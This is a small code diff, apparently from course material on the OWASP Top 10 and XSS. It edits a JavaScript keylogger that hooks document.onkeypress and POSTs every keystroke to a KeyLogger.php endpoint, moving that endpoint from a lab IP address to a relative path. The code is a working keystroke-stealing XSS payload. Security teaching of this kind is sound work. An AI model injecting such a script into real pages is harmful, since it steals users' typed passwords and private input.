@@ -13,8 +13,8 @@ document.onkeypress = function(evt)
     {
         var http = new XMLHttpRequest();
         var param = encodeURI(key)
-        http.open("POST","http://192.168.56.103/SecureSoftwareDevelopment/Lecture7OWASPTop10/2XSS/5KeyLogger/KeyLogger.php",true);
+        http.open("POST","KeyLogger.php",true);
         http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-        http.send("key="+param);
+            http.send("key="+param);
     }
 }
